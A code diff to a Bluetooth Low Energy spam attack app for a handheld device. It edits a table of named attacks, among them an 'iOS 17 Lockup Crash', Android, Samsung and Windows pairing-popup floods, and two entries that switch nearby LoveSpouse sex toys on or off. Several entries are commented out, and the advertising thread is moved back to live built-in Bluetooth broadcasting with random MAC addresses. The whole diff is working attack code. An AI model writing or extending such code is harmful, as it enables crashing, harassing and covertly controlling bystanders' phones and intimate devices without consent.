@@ -9,7 +9,7 @@
 #include <notification/notification.h>
 #include <notification/notification_messages.h>
 
-#include <nrf24.h>
+// #include <nrf24.h>
 
 // NAPI
 // TODO: Use __attribute__((aligned(2))) instead?
@@ -207,19 +207,19 @@ static Attack attacks[] = {
                 .cfg = {},
             },
     },
-    {
-        .title = "iOS 17 Lockup Crash",
-        .text = "Newer iPhones, long range",
-        .protocol = &protocol_continuity,
-        .payload =
-            {
-                .random_mac = false,
-                .cfg.continuity =
-                    {
-                        .type = ContinuityTypeCustomCrash,
-                    },
-            },
-    },
+    // {
+    //     .title = "iOS 17 Lockup Crash",
+    //     .text = "Newer iPhones, long range",
+    //     .protocol = &protocol_continuity,
+    //     .payload =
+    //         {
+    //             .random_mac = false,
+    //             .cfg.continuity =
+    //                 {
+    //                     .type = ContinuityTypeCustomCrash,
+    //                 },
+    //         },
+    // },
     {
         .title = "Apple Action Modal",
         .text = "Lock cooldown, long range",
@@ -246,29 +246,29 @@ static Attack attacks[] = {
                     },
             },
     },
-    {
-        .title = "Android Device Connect",
-        .text = "Reboot cooldown, long range",
-        .protocol = &protocol_fastpair,
-        .payload =
-            {
-                .random_mac = true,
-                .cfg.fastpair = {},
-            },
-    },
-    {
-        .title = "Samsung Buds Popup",
-        .text = "No cooldown, long range",
-        .protocol = &protocol_easysetup,
-        .payload =
-            {
-                .random_mac = true,
-                .cfg.easysetup =
-                    {
-                        .type = EasysetupTypeBuds,
-                    },
-            },
-    },
+    // {
+    //     .title = "Android Device Connect",
+    //     .text = "Reboot cooldown, long range",
+    //     .protocol = &protocol_fastpair,
+    //     .payload =
+    //         {
+    //             .random_mac = true,
+    //             .cfg.fastpair = {},
+    //         },
+    // },
+    // {
+    //     .title = "Samsung Buds Popup",
+    //     .text = "No cooldown, long range",
+    //     .protocol = &protocol_easysetup,
+    //     .payload =
+    //         {
+    //             .random_mac = true,
+    //             .cfg.easysetup =
+    //                 {
+    //                     .type = EasysetupTypeBuds,
+    //                 },
+    //         },
+    // },
     {
         .title = "Samsung Watch Pair",
         .text = "No cooldown, long range",
@@ -282,42 +282,42 @@ static Attack attacks[] = {
                     },
             },
     },
-    {
-        .title = "Windows Device Found",
-        .text = "No cooldown, short range",
-        .protocol = &protocol_swiftpair,
-        .payload =
-            {
-                .random_mac = true,
-                .cfg.swiftpair = {},
-            },
-    },
-    {
-        .title = "Vibrate 'em All",
-        .text = "Activate all LoveSpouse toys",
-        .protocol = &protocol_lovespouse,
-        .payload =
-            {
-                .random_mac = true,
-                .cfg.lovespouse =
-                    {
-                        .state = LovespouseStatePlay,
-                    },
-            },
-    },
-    {
-        .title = "Denial of Pleasure",
-        .text = "Disable all LoveSpouse toys",
-        .protocol = &protocol_lovespouse,
-        .payload =
-            {
-                .random_mac = true,
-                .cfg.lovespouse =
-                    {
-                        .state = LovespouseStateStop,
-                    },
-            },
-    },
+    // {
+    //     .title = "Windows Device Found",
+    //     .text = "No cooldown, short range",
+    //     .protocol = &protocol_swiftpair,
+    //     .payload =
+    //         {
+    //             .random_mac = true,
+    //             .cfg.swiftpair = {},
+    //         },
+    // },
+    // {
+    //     .title = "Vibrate 'em All",
+    //     .text = "Activate all LoveSpouse toys",
+    //     .protocol = &protocol_lovespouse,
+    //     .payload =
+    //         {
+    //             .random_mac = true,
+    //             .cfg.lovespouse =
+    //                 {
+    //                     .state = LovespouseStatePlay,
+    //                 },
+    //         },
+    // },
+    // {
+    //     .title = "Denial of Pleasure",
+    //     .text = "Disable all LoveSpouse toys",
+    //     .protocol = &protocol_lovespouse,
+    //     .payload =
+    //         {
+    //             .random_mac = true,
+    //             .cfg.lovespouse =
+    //                 {
+    //                     .state = LovespouseStateStop,
+    //                 },
+    //         },
+    // },
 };
 
 #define ATTACKS_COUNT ((signed)COUNT_OF(attacks))
@@ -391,17 +391,17 @@ static int32_t adv_thread(void* _ctx) {
             protocols[rand() % protocols_count]->make_packet(&size, &packet, NULL);
         }
         
-        //napi_furi_hal_bt_custom_adv_set(packet, size);
+        napi_furi_hal_bt_custom_adv_set(packet, size);
 
 
         if(payload->random_mac) furi_hal_random_fill_buf(mac, sizeof(mac));
         delay = delays[state->delay];
-        nrf24_send_single_ADV(nrf24_HANDLE, mac, packet, size);
+        //nrf24_send_single_ADV(nrf24_HANDLE, mac, packet, size);
         free(packet);
 
-        //napi_furi_hal_bt_custom_adv_start(delay, delay, 0x00, mac, 0x1F);
+        napi_furi_hal_bt_custom_adv_start(delay, delay, 0x00, mac, 0x1F);
         furi_thread_flags_wait(true, FuriFlagWaitAny, delay);
-        //napi_furi_hal_bt_custom_adv_stop();
+        napi_furi_hal_bt_custom_adv_stop();
     }
 
     if(state->ctx.led_indicator) stop_blink(state);
